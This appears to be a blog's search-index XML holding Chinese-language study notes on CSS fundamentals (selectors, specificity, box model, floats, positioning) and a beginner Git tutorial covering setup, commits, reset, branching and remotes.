<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CSS 基础-01</title>
    <url>/2017/10/15/CSS-01/</url>
    <content><![CDATA[
## 1. css文件导入方式

css的导入方式有四种： 

- **内联式** ：在head头标签中，通过style标签书写css

  > 使用场景：测试调试环境

  - 格式 :	

  ```代码
  <head>
  <style>
  	p{
          color:blue;
    		text-indent:2em;
  	}
  </style>
  </head>
  
  ```

- **外链式** ：在head头标签中，通过link标签引入css文件

  - 格式：

  > 使用场景：正式上线

  ```代码
  <head>
  <link rel="stylesheet" href="./demo.css">
  </head>
  
  ```

- **导入式** ：在head头标签中，通过style标签引入css文件

> 先加载html，再加载css，卡顿时会出现先出现原始内容的情况

```格式
<style>
	@import url('.demo.css')
</style>

```

**注意：@import 必须写在style标签里面的最前面**

​	    **@import 的本行最后必须加上分号；**

- **内嵌式** ：直接在开始标签中，通过style属性书写css

> 不推荐，优先级太高，可能打乱整体布局

```格式
<开始标签 style="属性名：属性值；属性名：属性值；"

```

## 2. css基础语法

**书写格式：**

```格式
选择器{
	属性名1：属性值；
	属性名2：属性值；
	属性名3：属性值；
	}

```

**注：css属性不区分大小写**

css注释：`/* 注释内容 */`

## 3. 颜色

**属性名**：color		字体颜色

**属性值**：

- 单词		       red  white   blue ...

- `#rgb`                      000~fff

  ​	                         r,g,b 的范围：0~9  a~f

- `#rrggbb`                000000~ffffff

- rgb(0~255,0~255,0~255)

- rgba(0~255,0~255,0~255,0~1)

  ```
  a:透明度，可小数
  
  
  ```

- hsla（h,s,l,a）       色轮值

  - h：色调            0~360
  - s：饱和度        %
  - l：亮度             %
  - a：透明度         0~1

**属性名**：opacity          透明度

**属性值**：0~1   可小数

## 4. 长度单位

### 1绝对长度

​	cm		  厘米

​	mm		毫米

​	in		    英寸

> 1 in=2.54 cm=25.4 mm

### 2相对长度

​	px		像素

​	em		倍数

​	%		  百分比

## 5. 基础选择器

### 1 html四大通用属性

style		样式

name	      命名

class		类，绰号

id		     身份码

### 2 基础选择器

#### - 标签选择器：

​	格式：标签名{...}

​	特性：匹配方位广，涉及整个body。适合做初始化

#### - 类选择器：

​	格式：.class名{...}

​	特性：一个标签可以有多个class名

​		    多个标签可以有相同的class名

#### - 身份选择器：

​	格式：#id名{...}

​	特性：一个标签只能有一个id名，多个标签原则上不能有重复id

> css可以重复id，但js检查到重复id会报错

## 6. 选择器详解

### 1.关联选择器

> 关联选择器：也叫关系选择器

​	设：s1,s2,s3,...为基础选择器

​	则：

```关系
s1 s1{ ... }  匹配s1下的所有后辈
s1>s2{ ... }  匹配s1下的所有儿子s2
s1+s2{ ... }  匹配s1后面的一个兄弟元素s2
s1~s2{ ... }  匹配s1后面的所有兄弟

```

### 2.组合选择器

**格式：**`s1，s2，s3，...，sn{ ... }`

分别给s1, s2 和 s3等元素赋予相同的css样式

s1, s2等元素之间没有关系

### 3.伪类选择器

**格式：**`s1:hover{ ... }`	

**效果：**当鼠标悬停在s1上时，触发css样式

​	**隔山打牛类：**	

- `s1:hover s2{}`

​	当鼠标悬停在s1上时，s1下所有后辈s2触发css样式

- `s1:hover>s2{}`

  当鼠标悬浮在s1上时，s1下的所有儿子s2触发css样式

- `s1:hover+s2`

  当鼠标悬浮在s1上时，s1后的一个兄弟元素s2触发css样式

- `s1:hover~s2`

  当鼠标悬停在s1上时，s1后的所有兄弟元素s2触发css样式

  

  **引申级**

  - `s1:first-child{...}`	

  找s1父级下的第一个标签，若是s1，应用css样式

  - `s1:first-of-type{...}`

  找到s1父级下的第一个标签，应用css样式

  - `s1:last-child{...}`

  找s1父级下的最后一个标签，若是s1，应用css样式

  - `s1:last-of-type{...}`

  找到s1父级下的最后一个标签，应用css样式

  - `s1:nth-child{...}`

  找s1父级下的指定顺序的标签，若是s1，应用css样式

  - `s1:nth-of-type{...}`

  找到s1父级下的指定顺序的标签，应用css样式

> nth属性值
>
> ​	单词：奇数（odd）   偶数（even）
>
> ​	公式：一元一次方程（2n）（2n+1）（3n+5）

4.伪对象选择器

- `s1::before{...}`在s1里面内容的最前面

- `s1::after{...}` 在s1里面内容的最后面

  content 配合before，代表内容

  before和after配合将来的浮动技术做布局使用

## 7. 优先级

**各标签权重值**：

​	标签名：1		class名：10			id名：100

**优先级规则**：

​	权重值越大，优先级越高

​	权重值相同，离标签越近的选择器，优先级越高

**权重值可以叠加**

**最高权重**：

​	没有具体值，只是一种象征

​	格式：属性值 !important

**继承性**：

​	许多标签都可以继承祖辈的大多数属性，会有小部分属性无法继承

​	例如：

​		a标签的颜色

​		h标签的大小

​		。。。

> 组合选择器前后权重不会叠加，互不影响

## 8. 边框

### 1 border

**属性名**：border

**属性值**：方向（top   bottom   left     right）

- **单边**： border-方向-color：	边框单边颜色

  ​	    border-方向-width：	边框单边宽度

  ​	    border-方向-style：	  边框单边线显示（solid）或关闭（none）

  简写：border-方向：[color|width]|style

- **四边**：border-color：                 边框四边颜色

  ​	    border-width：                边框四边宽度

  ​	    border-style：		  边框四边线显示/关闭

  简写：border：[color|width]|style

**注意**：单边和四边属性中，style属性必须设置，简写没有先后顺序要求



### 2 radius

**属性名**：border-radius		圆角

**属性值**：px，%

​	border-上下-左右-radius：		单边圆角

### 3 collapse

**属性名**：border-collapse		边框合并（一般用于表格）

**属性值**：collapse

### 4 outline

**属性名**：outline		外轮廓

**属性值**：与border相同，常用none，取消外轮廓

## 9. 字体

属性名：font

属性值：

- font-size：		字体大小

> 不同浏览器最小值不一样，竟可能不要触碰最小值

- font-family:		字体家族

> 必须本地存在该字体，浏览器才可以使用

- font-weight：		字体加粗

  属性值：加粗（bold）或 普通（normal）

- font-style：                字体倾斜

  属性值：斜体（italic）或 普通（naomal）

- line-height:                行高

> line-height 若设置为与当前元素的高度一致，怎显示垂直居中效果（仅限一行）

**简写**：font：size family
`font:[weight\style] size [/line-height] family;`

注意：font属性至少要写 size 和 family，且 font 属性中 size 必须在family的前面

> 手册常用公式写法：
>
> ​	| 选择左侧或者右侧或者两者都选，前后顺序无要求
>
> ​	[ ] 中括号内部的值可写可不写

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>CSS</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS 基础-02</title>
    <url>/2017/10/22/CSS-02/</url>
    <content><![CDATA[
## 1.背景

属性名：**background** 

子属性名：

​	**background**-color：		背景颜色

​	**background**-image:		背景图片	属性值：url（' 链接地址 '）

​	**background**-**repeat**:		背景重复	属性值：no-repeat | repeat-x |repeat-y |repeat（默认）

​	position: X Y		若x和y的值为正数，向右或下移动；若x和y 的值为负数，向左或上移动

​	background-size：		背景大小

简写：`background:[color | image | repeat | position[/size]]`

**注意：定位position尺寸必须放在size尺寸前面**	`10px 10px/200px`

## 2.盒子阴影

属性名：**box-shadow**

属性值：s1，s2，s3，s4，s5（color），s6（insert）

1. s1 水平位移	可负值
2. s2 垂直位移	可负值
3. s3 模糊度            不能取负值，0为不模糊
4. s4 阴影面积        不能取负值，0为原大小，可以省略
5. s5 阴影颜色         
6. 内阴影             后加inset，可省略    `    		box-shadow: -104px -97px 0px 0px blue inset;`

**简写**：`box-shadow:s1 s2 s3 [s4] s5 [s6;]`

**拓展**：

> 移动当前元素到页面中间`margin:100px auto;`
>
> solid-实线	dashed-虚线	dotted-点状线	double-双实线

## 3.平滑过渡

属性名：**transition**

属性值：s1，s2，s3，s4

1. s1 过渡的标签名（transition-property）	

   ​	取值：all（所有可以过渡的属性）  none（不指定过渡的属性）   <标签名>

2. s2 过渡的持续时间（transition-duration）

   ​	取值：<持续时间>		1 s = 1000 ms

3. s3 过渡速率（transition-timing-function）

   ​	取值：linear（线性）	ease（平滑）	ease[-in|-out]（缓入、缓出、缓入缓出） 

4. s4 延迟时间（transition-delay）

**注意：transition能起作用的前提条件是该标签的属性值是可以进行 + / - 的值**

eg：`transition:a .5s ease`  /  `transition：all 1s ease ；`  /   `transition:p1,p2,p3 .5s ease`

## 4.变形

属性名：**transform**

属性值：

1. none		不变形
2. rotate		旋转		单位：deg
3. skew		扭曲		单位：deg
   1. skewX		指定水平方向扭曲
   2. skewY		指定垂直方向扭曲
4. scale		中心缩放		单位：倍数
   1. scaleX		水平缩放		单位：倍数
   2. scaleY		垂直缩放		单位：倍数
5. translate		位移                单位：px
   1. translateX		指定x轴方向的位移
   2. translateY		指定y轴方向的位移

**注意：skew扭曲为90*奇数倍时，都会被扭曲成一条线，导致看不见**

## 5.列表样式

属性名：**list-style**

属性值：

1. list-style-image		项目列表标记图像
   1. none		不指定图像
   2. <url(' ... ')>		使用指定图像作为项目列表标记
2. list-style-position		
   1. outside		标记放在文本外，且文本不依据标记对齐
   2. inside		标记放置在文本内部，依据标记对其文本
3. list-style-type		项目列表标记类型
   1. disc		实心圆（默认）
   2. circle		空心圆
   3. square		实心方块
   4. none		不适用项目符号

简写：`list-style[list-style-image]|[list-style-position]|[list-style-type]`

## 6.溢出

属性名：**overflow**

> 包括overflow-x，和overflow-y

属性值：

1. visible		不剪切（默认）
2. hidden		将超出对象尺寸的内容进行裁剪，将不出现滚动条。
3. auto		将超出部分内容剪切，并以滚动条方式显示超出对象

常见属性

​	width	height	

​	mingwidth	maxheight	

​	minheight	maxheight

## 7.文本

- text-indent:		首行缩进（也可控制图片）（单位：px ，%，em）

- text-align:		水平对齐方式（left    center    right）（对image标签也起作用）

- text-decoration		划线方式（underline   overline     line-through    none   blink）

- text-shadow		文本阴影

  格式：`text-shadow：h-shadow   v-shadow    blur   color;`

- text-overflow		溢出文本处理

  - 属性值：clip	修建文本
  - 属性值：ellipsis	使用省略号代替省略的文本ellipsis

  > 强制转为一行：`white-space:nowrap;`
  >
  > 将溢出内容隐藏：`overflow:hidden`

- vertical-align		垂直对齐（top   middle    bottom）

  ​					（默认情况情况下，是对外垂直对齐）

  ​					（若对内对齐，则需要配合display属性）

  > 将当前元素转为td单元`display:table cell`
  >
  > 垂直居中：`line-height:500px;`	`vertical-align:middle;`

## 8.鼠标样式

**属性名**：cursor（光标，指针）

**属性值**：

​		pointer			指向（手掌样式）

​		text			文本（大写的 i 字样式）

​		move			移动（十字箭头）

​		default			默认（鼠标指针）

​		none			隐藏箭头

**补充**：progress（正在进行）|wait（等待）|方向-size（双向箭头）|no-drop（无法拖动）|crosshair（十字准星）

## 9.字体图标

> 计算机中图片分为两类：位图、矢量图
>
> 位图：放大失真
>
> 矢量图：放大不失真

字体图标基本都是矢量图，可以使用字体的属性，但不能使用图片的属性

字体图标**下载**：阿里巴巴矢量图url（‘ https://www.iconfont.cn/ ’）

阿里字体图标**使用**：

​	1.下载图标文件

​	2.导入iconfont.css文件

​	3.给需要使用字体图标的标签赋予class="iconfont"

​	4.给需要使用字体图标的位置填写相应的图标符号（查询demo_unicode.html文件）

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>CSS</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS 基础-03</title>
    <url>/2017/10/29/CSS-03/</url>
    <content><![CDATA[
## 1.盒子模型

> 盒子模型分为两类：（非IE）标准物理盒子 和 IE盒子

**标准物理盒子**：物理空间=内容+边框+内边距    	（以外都是外边距）

IE**盒子**：物理空间=内容		内容包括边框和内边距（内容固定，做减法）	（以外都是外边距）

## 2.行块级元素

> html中，标签分为两种： 块级 和 行级

块级元素（display：block）：

**特征**：    1.独占一行。

​		2.宽度若不设置，则默认与浏览器宽度一样；

​		3.高度若不设置，则默认随着内容增高而增高；

​		4.宽高，行高，内外边距的等属性均可以设置；

​		5.容纳性：可容纳任何元素；

**行级元素**（display：inline）：

**特征**：1.不独占一行；

​		2.宽度若不设置，则默认随着内容的增加而增加；

​		3.高度若不设置，则默认随着内容的增高而增高；

​		4.宽高，内外上下边距等无法控制，行高，内外左右边距等可以控制；

​		5.容纳性：行级元素

## 3.内外边距

**外边距**（margin）：定义元素与元素之间的距离

​	margin：10px；（四边）

​	margin：10px  20px；（上下10，左右20）

​	margin：10px  20px  30px；（上10，左右20，下30）

​	margin：10px  20px  30px  40px；（上10 ，右20，下30，左40）

**单边距**：

​	margin-方向 :__px；

**常用技巧**：基于父级宽度内，自动居中

​	margin-left：auto；

​	margin-right：auto；

**常见简写**：

​	marigin：__px  auto；



**内边距**（padding）：定义边框与内容之间的距离

​	padding：10px；（四边）

​	padding：10px  20px ；（上下10，左右20）

​	padding：10px  20px  30px；（上10，左右20，下30）

​	padding：10px  20px  30px  40px；（上10，右20，下30，下40）

**单边距**

​	padding-方向：__px;

## 4.定位(position)

使用场景：当元素（标签）发生重合时，就可以使用定位判定双方的位置属性。

属性名：`position`

属性值：

- `absolute`（绝对定位）

  > 定位后是否保留原位置：不保留原来的位置（网）
  >
  > 定位原点：基于网页第一页的四个角落

- `relative`（相对定位）

  > 定位后是否保留原有位置：保留原来的位置（柱子）
  >
  > 定位原点：基于原来位置的四个角落

- `fixed`（固定定位）

  > 定位后是否保留原有位置：不保留原来的位置（网）
  >
  > 定位原点：基于当前可视窗口的四个角落

------



**补充概念**：

**文档流**：在body体中，标签从上往下依次排列，形成一条奔流不止的河流。

**定位**：脱离文档流，原始位置就会被清除，下方元素上移补位，定位元素就会与文档流中的元素发生重叠

**定位优先级**(z-index)

​	当定位元素发生重叠时，可通过`z-index`来改变上层顺序；

​	格式：`z-index:数字；`

​	其中数字越大，优先级越高

> 仅限定位元素使用

## 5.浮动

属性名：`float`

属性值：`left | right | none`

作用：脱离文档流，将兄弟（同级）元素排成一排

位置：不保留原来的位置

<style>
    .box1{
        background:pink;
        float:left;
        /*float:right;*/
    }
</style>

<hr>	

有些场合不需要保留原来的位置，但有些也需要保留原来的位置

如何保留原来的位置：通过clear清除浮动

<hr/>

## 6.清除浮动

属性名：`clear`

属性值：`left | right | both`

- 方法一：条件（原理）

  在兄弟元素的最后面，加空标签（非浮动），通过空标签来清除前面的浮动元素

  ```示例
  原理	
  		<ul>
  			<li>小米手机</li>
  			<li>红米</li>
  			<li>电视</li>
  			<li>笔记本</li>
  			<li>家电</li>
  			<li>新品</li>
  			<li>路由器</li>
  			<li>智能硬件</li>
  			<div style="clear: left;"></div>
  		</ul> 
  ```

- 方法二

  ​	在浮动元素的父级，添加属性`overflow：hidden`，形成BFC区域，即可清除儿子项的浮动

  > BFC区域：内部元素不会影响任何外界的元素（统统保留位置）
  >
  > 形成BFC区域的方式：`overflow：hidden；`或者 `float：none；`
  >
  > 目前部分浏览器不支持BFC，故不推荐此种写法

  ```示例
  	<ul style="overflow:hidden">
      	<li>小米手机</li>
      	<li>红米</li>
      	<li>电视</li>
      	<li>笔记本</li>
      	<li>家电</li>
      	<li>新品</li>
      	<li>路由器</li>
      	<li>智能硬件</li>
      </ul> 
  ```

- 方法三

  在浮动元素的父级，通过伪对象的方式实现清除儿子项的浮动

  ```
  父级元素::after{
      content:' ';
      display:block;		/*将当前元素转为块级标签*/
      clear:both;
  }
  ```

  ```示例
  	<style>
  		/* 完美点的 方法3 */
  		ul::before, ul::after{
  			content:'';
  			display:block;
  		}
  		ul::after{
  			clear:both;
  		}
  	</style>
  		...
  	<ul>
      	<li>小米手机</li>
      	<li>红米</li>
      	<li>电视</li>
      	<li>笔记本</li>
      	<li>家电</li>
      	<li>新品</li>
      	<li>路由器</li>
      	<li>智能硬件</li>
      </ul> 
  ```

  ​	**友情提示：浮动若不需要后面的元素向上填充，记得及时清除浮动**

- 四.市场常用写法：

  ```
  	.clearfix::before, .clearfix::after{
          content:' ';
          display:block;
  	}
  	.clearfix::after{
          clear.both
  	}
  	之后儿子项需要使用清除浮动，只需给父级赋予class="cleanfix"
  ```

  

## 7.元素转换

标签名：**display**

标签名：

- **block**

  将当前元素转换为块级元素	（替换：独占一行，可应用宽高控制）

  `.i2{width: 400px; height: 100px; background: skyblue; display: block;}`

- **inline**

  将当前元素转换为行级元素	（替换：无法使用宽高控制，不独占一行）

  `.b1{width: 300px; height: 50px; background: pink; display: inline; }`

- **inline-block**

  将当前元素转换为内联-块元素（既不独占一行(block)，也可以应用宽高控制(inline)）

  `.b3{width: 300px; height: 50px; background: pink; display: inline-block;}`

- **table**

  将当前元素转换为块级表格

- **table-cell**

  将当前元素转换为`td`单元格

- **none**

  将当前元素隐藏（不占位）

  `.box1{width: 300px; height: 50px; background: lightgreen; display: none;`

- `visibility：hidden`	

  将当前元素隐藏（占位）

  `.box1{width: 300px; height: 50px; background:lightgreen; visibility: hidden;}`

## 8.初始化

​	**目的**：各个浏览器对css样式的默认设定值不一定一样，为了保证代码在各个浏览器上显示的效果一致，所以需要对浏览器的默认css值重新统一设定，（也称**初始化**）

​	主要初始化内容包括：默认内外边距（margin、padding），字体（font），项目符号（li），超链接（a下划线），表格等

## 9.网页布局

主要使用：Div+Css

在布局中主要使用定位和浮动，为方便维护修改，推荐尽量使用浮动

布局规则：

- 由宏观到微观
- 先看行，再看列
- 由上至下，从左到右

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>CSS</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>Git 版本控制</title>
    <url>/2018/08/20/Git%20%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/</url>
    <content><![CDATA[
# Git 版本控制


### 1. 什么是 Git

> Git 是当今世界上最先进/最好用的分布式版本控制系统，没有之一

### 2. 什么是版本控制系统?

> #### 版本控制 --- 《维基百科》
>
> 版本控制是一种软件工程技巧，能在软件开发的过程中，确保由不同人所编辑的同一个代码文件都得到同步.
> 版本控制能使项目的设计者，将项目恢复到之前任意的状态，这种选择权在设计过程中特别重要.
> 理论上所有的信息记录都可以加上版本控制:利用版本控制来追踪、维护源码、文件以及配置文件等等的改动

------

### 3. 版本控制发展史

#### 3.1 文件名方式

早年的软件开发过程，代码管理以手动和邮件等形式，文件命名及保存存在问题

> 如图 : 文件命名方式
>
> ![文件命名](/images/imgs/%E6%96%87%E4%BB%B6%E5%91%BD%E5%90%8D.png)

> 如图 : 毕业论文版本
>
> ![文件名控制版本](/images/imgs/01.jpg)

#### 3.2 集中式

包括库和工作区两部分：在工作区编码，然后上传至库的方式，完成多人协作。
问题：工作机与库机，需要联网才能控制版本，传输速度较慢。

![集中式版本控制](/images/imgs/02.png)

#### 3.2 分布式

每台电脑都有，工作区和库，可以自己控制版本。数据更加安全，有逻辑上的中心。

![分布式版本控制](/images/imgs/03.png)

------

### 4. 常见版本控制系统

> 如图 : 版本管理器的发展史

![版本管理器的发展史](/images/imgs/04.png)

> 这张图上，分成了四个时期 :

> ● 史前时期：1982年的RCS。现在你可能还能在Unix的发布包中找到它。

> ● 古典时期：1990年的CVS自身缺陷已经过时；1985年的PVCS、1992年的clearcase（费用昂贵、功能复杂沿用至今）；微软VVS反人类；Perforace（广泛，谷歌内部最大代码管理器）

> ● 中世纪时期：SVN解决了CVS的问题，集中式领域王者。AccuRev（支持分支合并让很多公司拜托cvs和clearcase）。

> ● 文艺复兴：BitKeeper（SUN公司大量使用），2002年Linux内核使用BitKeeper，2005年闭源时有人试图破解BitKeeper，于是出现了Git。

#### Git 问世

Git的第一个版本是Linux之父Linus Torvalds亲手操刀设计和实现的（两周内 用C写完），Linus不仅仅给出一个原始设计，并在向世人介绍Git时强烈批评了CVS和SVN等，Git消除了分支和合并的恐惧。很多大型开源项目由SVN迁移至Git。

2008年[GitHub](https://github.com/)也成为世界最大的SCM系统(软件配置管理)，它使用的就是Git版本库的技术.从此Git成为版本控制系统的主流。

GitHub上的著名项目 :
Linux内核、安卓、jQuery、Bootstrap、Ruby ...

------

### 5. Git 的安装 和 基本配置

#### 5.1 安装

> Linux 安装
>
> > 二进制包（在线）
> > yum -y install git    // RedHat系列
> > apt-get git install   // Debian系列
> > 源码包（官网下载）

> Windows 安装
>
> > Git 在 Windows 使用模拟环境 msysgit
> > 下载地址：
> > [https://git-for-windows.github.io/](https://git-for-windows.github.io/)
> > 注意：如果想让 windows 作为 git 服务器则需要搭建ssh服务。

------

> 本教程使用 windows 版本来做演示 :
> 安装步骤:  (如果你不熟悉每个选项的意思，请保持默认的选项)

- 以`管理员方式`运行安装包,选择 `是` 安装

![安装00](/images/imgs/git00.png)

- 同意协议条款

![安装01](/images/imgs/git01.png)

- 选择安装选项: 安装Git Bash和Git GUI，创建图标(可选)

![安装02](/images/imgs/git02.png)

- 选择 Git 的默认编辑器 (默认为vim,可选取自己熟悉的编辑器)

![安装03](/images/imgs/git03.png)

- 选择: `git form the command line and also form 3rd-party software` (GIT命令行和第三方软件)

![安装04](/images/imgs/git04.png)

- 选择: 选择 OpenSSL 传输 HTTPS 的信息

![安装05](/images/imgs/git05.png)

- 选择 : 换行符默认为 windows 环境为主

![安装06](/images/imgs/git06.png)

- 选择 : MinTTY 默认终端

![安装07](/images/imgs/git07.png)

- 选择 : 系统文件缓存 和 git 的管理器(需要.net v4.5.1)

![安装07](/images/imgs/git08.png)

- 实验选项，暂不选择

![安装09](/images/imgs/git09.png)

- 点击 Install 安装，开始安装

![安装10](/images/imgs/git10.png)

- 安装完成，选择运行`git bash`工具

![安装11](/images/imgs/git11.png)

- Git 运行界面 (命令行提示的是 你电脑的用户名)

![安装12](/images/imgs/git12.png)

------

#### 5.2 配置

> 无论 Linux 还是 Windows，安装完成后都要初始化

```sh
# 查看 git 版本
git --version

# 查看配置
git config -l

# 设置用户名和邮箱
git config [--global] user.name "Your Name"
git config [--global] user.email "your@email.com"

# 中括号内的参数:
#     --local  本地
#     --system 系统
#     --global 全局
#     无参，则为当前库配置身份

# 如:
git config --global user.name "seeker"
git config --global user.email "3300696254@qq.com"
```

### 6. Git常用操作

#### 6.1 生成新的版本库

1. 新建空目录
2. 进入该目录---单击右键---选择 `Git Bash Here`
3. 弹出 git 的命令行工具
4. 初始化该目录为版本仓库，键入 `git init`
5. 显示 `Initialized empty Git repository in xxxxxx`
6. `ls -a` 查看该目录下出现`.git`的隐藏目录，即版本库
7. 初始化完成

#### 6.2 添加文件到版本库

1. 新建文件 `1.txt`
2. 查看当前版本状态

```sh
# 查看当前版本状态
git status
```

3. 红字提示有文件未跟踪（未加入版本控制）
4. 在命令行内输入以下，添加文件至版本库：

```sh
# 添加文件至缓存区
git add 1.txt

# 再次查看版本库状态
git status
# 提示有要提交的修改，有一个新增的文件

# 提交文件至版本库
    # 直接提交
    # 回车后，会打开指定的编辑器编写描述信息
    git commit
    # 填写完描述信息，保存关闭即可
    
    # 或者带参数 -m 直接写入提交的描述信息
    git commit -m "新增1.txt"

# 新建 2.txt / 3.txt
# 多文件添加
git add 2.txt 3.txt

# 将缓存区的多次添加一次提交
git commit -m "新增2.txt+3.txt"

# ps:
# 添加所有改动过的和新增的文件到缓存区 (不包括被删除的文件)
git add .
# 添加所有文件到缓存区
git add --all
git add -A
```

5. 执行完后，提示提交完成
6. 查看提交后的版本库状态：

```sh
$ git status
On branch master
nothing to commit, working tree clean
```

7. 至此，最简单的添加文件，到版本库的操作已完成

------

#### --- PS部分: Git 实现原理 ---

1. 工作区 : 就是程序员日常编写代码的文件夹
2. 版本库 : 负责代码版本控制，就是`.git`隐藏目录
3. 版本库原理图 :

![版本库原理](/images/imgs/05.png)

版本库包括：暂存区（index/stage），HEAD（指针），分支（默认为 master 主分支）等。

文件提交至版本库总共分两步：  

1. `git add filename` # 添加至 stage 缓存区
2. `git commit -m "描述"` # 将 stage 的内容提交至版本库的 master 分支

> 实验：
>
> 1. 修改文件 >>> 查看状态
> 2. 添加到缓存区 >>> 查看状态
> 3. 再次修改 >>> 提交 >>> 查看状态

实验过程如下，观察理解 Git 实现机制：

1. 修改文件 >>> 查看状态：
   - 修改`1.txt`文件的内容，添加一行`111`，查看状态：`git status`
   - 提示：`Changes not staged for commit:` (工作区的修改，还没有提交到缓存区)
   - 显示红字，`modified:   1.txt`
2. 添加到缓存区 >>> 查看状态：
   - 添加到缓存区`git add .`
   - 查看状态：`git status`
   - 提示：`Changes to be committed` (要提交的修改。表示已提交到缓存区，待提交到版本库)
   - 显示绿字：`modified:   1.txt`
3. 再次修改 >>> 提交 >>> 查看状态
   - 继续修改文件：`1.txt`文件的内容,添加一行`222`
   - 提交版本库：`git commit -m "第1次修改 1.txt"`
   - 再次查看状态：`git status`
   - 提示：`Changes not staged for commit`(表示工作区中，还有修改记录，没有被提交到版本库之中)
   - 显示红字：`modified:   1.txt`

说明：

- 第 3 步的提交，只是提交了缓存区内，已经缓存过的内容（即，第二步的`add .`操作)
- 第 3 步中的第二次修改文件内容的记录，并没有添加到缓存区，所以版本库与工作区文件不一致
- 此时需要将第二次的修改记录，添加到缓存区，再次提交即可

```sh
git add.
git commit -m '第2次修改 1.txt'
git status
```

------

#### 6.3 查看文件修改状态相关

```sh
# 查看当前版本状态（是否修改）
git status
```

修改文件，测试区别:

```sh
# 当 工作区/缓存区/版本库 都一致时，使用以下命令不会有任何提示
git diff            # 工作区 与 缓存区的区别
git diff --cached   # 缓存区 与 版本库的区别
git diff HEAD       # 工作区 与 版本库的区别

# 更改工作区的 1.txt，并将更改添加到缓存区
# 然后再次更改工作区的 1.txt，并保存文件的更改
# 再次测试以上三条命令
```

------

#### 6.4 Git 日志

```sh
# 查看提交历史
git log
# 以简短的方式查看提交日志
git log --oneline

# 行为日志，显示所有提交，回滚等..
git reflog
# 显示缓存区的所有文件
git ls-files
```

------

#### 6.5 版本回退

```sh
# 将当前版本重置为 HEAD（通常用于清空缓存区，或 merge 失败回退）
git reset --hard HEAD

git reset --hard HEAD^   # 回退上一个版本
git reset --hard HEAD^^  # 回退上两个版本
git reset --hard HEAD~n  # 回退上n个版本

# 回退到指定版本，commitid 可根据日志获取，'<>'内的id必填
git reset --hard <commitid>

```

------

#### 6.6 撤销

> 目的：将尚未提交至版本库的修改撤回

- 情况一 : 文件修改后，尚未添加至缓存区

```sh
# 修改 1.txt 的内容：添加一行
# 在工作区撤销文件的修改
git checkout -- filename
# 注意'--'不可缺少。没有'--'，就变成了“切换到另一个分支”的命令

```

- 情况二 : 文件修改后，已添加至缓存区

```sh
# 修改 1.txt 的内容：添加一行，并添加到缓存区
# 撤回添加至缓存区的修改
git checkout HEAD filename

```

------

#### 6.7 Git 删除

- 删除文件和版本库记录

```sh
# `rm`命令只会删除工作区的文件，不会删除记录
rm 2.txt
git status  # 提示2.txt 被删除，是否需要提交到版本库
# 如果删错文件，则可以撤回删除(因为此时的删除操作，还未写入到缓存区)
git checkout -- 2.txt

# 将 2.txt 的删除记录写入到缓存区，并删除文件
git rm 2.txt
# 如果还未提交，想要撤回，可使用 `git checkout HEAD 2.txt`
# 提交 2.txt 的删除记录到版本库中
git commit -m '删除2.txt'

```

- 删除缓存区的文件

```sh
# 新建 demo.html 文件，并加入到缓存区
git add demo.html
git status  # 提示有新文件等待提交
# 将 demo.html 文件移出缓存区，但不删除(文件还会保留在工作区)
git rm --cached demo.html
git status  # 提示工作区有文件等待 add

# 重新将 demo.html 加入到缓存区
# 将缓存区中的 demo.html 文件移出并删除(工作区不保留文件)
git rm -f demo.html

```

- 其他删除

```sh
# 新建 aaa/111.txt
# 新建 aaa/bbb/111.txt
# 将文件添加到版本库中
git add .
git commit -m '添加aaa目录及文件'
# 递归删除目录(删除的是，已被记录到版本库的目录)
git rm -r 目录名
git commit -m '删除aaa目录'

```

#### 6.8 Git 流程图

![Git流程图](/images/imgs/Git%E6%B5%81%E7%A8%8B%E5%9B%BE.png)

------

### 7. 远程仓库

#### 7.1 得到远程的版本库

> 可以使用两种方式来得到远程版本库:

- 在某个指定的文件夹下使用，即可得到远端版本库及代码

```sh
git clone <远端版本库url> <本地存放该库的文件夹名>

```

- 手动添加版本库,并拉取文件

```sh
# 初始化本地仓库
git init

# 添加远程版本库 <remote>可自行取名,默认origin
git remote add <remote> <url>

# 查看远程版本库信息
git remote -v
# 查看指定远程版本库信息
git remote show <remote>

# 删除远程remote链接
git remote remove <remote>

# 下载代码及快速合并
git pull <remote> <branch>

```

------

#### 7.2 推送分支代码

得到远端版本库后,可以在本地按正常的步骤编辑 :
新建或改动文件-->添加至缓存区-->提交到版本库

此时,要想将本地版本库发给远端,只有commit提交是不够的.
还需要下面的操作 :

```sh
git push <remote> <branch>
# 上传代码及快速合并

```

执行以上代码,会有报错 : 无法直接推送到远端的主分支
此时,可以曲线救国，推送自己的分支到远端即可 :

```sh
git push origin master:dev

```

此时,推送成功!

------

### 8. Git 分支管理

#### 8.1 查看版本库分支

```sh
# 显示本地分支
git branch
# 显示所有分支
git branch -a
# 切换到指定分支或标签
git checkout 分支名/标签名

```

#### 8.2 创建分支/删除分支

```sh
# 新建分支
git branch 分支名
# 创建并切换到dev分支
git checkout -b dev

# 删除本地分支 -D 强制删除
git branch -d 分支名

```

#### 8.3 合并分支

要将 B分支 合并到 A分支里
请切换到A分支内,合并B分支的操作在A分支内进行

```sh
# 合并分支到当前分支
git merge 分支名

```

#### 8.4 解决合并冲突

> 多分支修改同一文件，合并可能出现冲突。冲突部分用<<<===>>>表示

![合并冲突](/images/imgs/06.png)

解决方法：
先手动修改冲突部分，再次提交即可。

#### 8.5 分支管理策略

在实际开发中，我们应该按照几个基本原则进行分支管理：

首先，master分支应该是非常稳定的，也就是仅用来发布新版本，平时不能在上面干活；

那在哪干活呢？干活都在dev分支上，也就是说，dev分支是不稳定的，到某个时候，比如1.0版本发布时，再把dev分支合并到master上，在master分支发布1.0版本；

你和你的小伙伴们每个人都在dev分支上干活，每个人都有自己的分支，时不时地往dev分支上合并就可以了。

所以，团队合作的分支看起来就像这样：

![分支管理](/images/imgs/07.png)

#### 8.6 多人协作

多人协作的工作模式通常是这样：

首先，可以试图用`git push origin <branch-name>`推送自己的修改；
如果推送失败，则因为远程分支比你的本地更新，需要先用`git pull`试图合并；

